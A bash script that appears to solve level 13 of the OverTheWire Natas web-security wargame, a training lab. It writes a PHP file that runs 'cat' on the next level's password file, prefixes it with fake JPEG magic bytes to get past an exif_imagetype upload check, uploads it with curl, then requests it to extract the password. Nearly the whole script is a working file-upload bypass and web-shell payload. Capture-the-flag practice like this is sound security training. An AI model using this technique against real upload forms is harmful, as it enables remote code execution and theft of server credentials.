#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi
# We can upload a file to the server
# exif_imagetype just checks the first four bytes for a specific image type
# We cheat those bytes into a new php file
echo -n -e \\xFF\\xD8\\xFF\\xE0'<?php\npassthru("cat /etc/natas_webpass/natas14");\n?>\n' > natas13.php
# Let's fill out the form
# We will just upload the file natas13.php if the user doesn't specifiy otherwise.
base_url="http://natas13.natas.labs.overthewire.org/"
regex=">(upload/[[:alnum:]]{10}\.php)"
content=`curl -s --user natas13:$1 \
  -F "MAX_FILE_SIZE=1000" \
  -F "filename=natas13.php" \
  -F "uploadedfile=@$PWD/natas13.php" \
  -F "submit=Upload File" \
  $base_url`
if [[ $content =~ $regex ]]
then
  echo 'The password for natas14 is' $(curl -s --user natas13:$1 \
    $base_url${BASH_REMATCH[1]} | grep -E -o ".{32}$")
fi
rm $PWD/natas13.php
